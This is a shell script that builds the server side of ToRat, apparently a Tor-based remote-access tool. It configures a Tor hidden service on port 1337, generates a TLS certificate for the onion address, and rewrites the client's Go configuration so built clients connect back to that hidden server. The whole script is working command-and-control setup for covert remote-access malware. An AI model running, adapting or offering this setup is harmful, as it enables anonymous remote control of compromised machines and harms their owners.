die() {
    echo
    echo "Setup failed: $1"
    exit 1
}

tee -a /torrc <<EOF
HiddenServiceDir /torat_hs/
HiddenServiceVersion 3
HiddenServicePort 1337 127.0.0.1:1338
EOF

tor -f /torrc&
sleep 10
hostname=$(cat /torat_hs/hostname) || die "Could not read Hostname from /var/lib/tor/torat/hostname"

cd /go/src/github.com/lu4p/genCert || die "Could not cd ./genCert"
go run genCert.go --ca --host $hostname || die "Could not generate tls certificate"
mv *.pem /dist/server || die "Could not copy *.pem to /dist/server/cert.pem"
cert=$(cat /dist/server/cert.pem) || die "Could not read /dist/server/cert.pem"

conf=$(cat << EOF
package client

import "github.com/lu4p/ToRat/torat_client/crypto"

const (
	// serverDomain needs to be changed to your address
	serverDomain = "${hostname}"
	serverPort   = ":1337"
	serverAddr   = serverDomain + serverPort
)

// serverCert needs to be changed to the TLS certificate of the server
// intendation breaks the certificate
const serverCert = \`${cert}\`

var (
	ServerPubKey, _ = crypto.CertToPubKey(serverCert)
)
EOF
)

rm /go/src/github.com/lu4p/ToRat/torat_client/conf.go -f || die "Could not remove /go/src/github.com/lu4p/ToRat/torat_client/conf.go"
tee -a /go/src/github.com/lu4p/ToRat/torat_client/conf.go<<EOF
${conf}

EOF

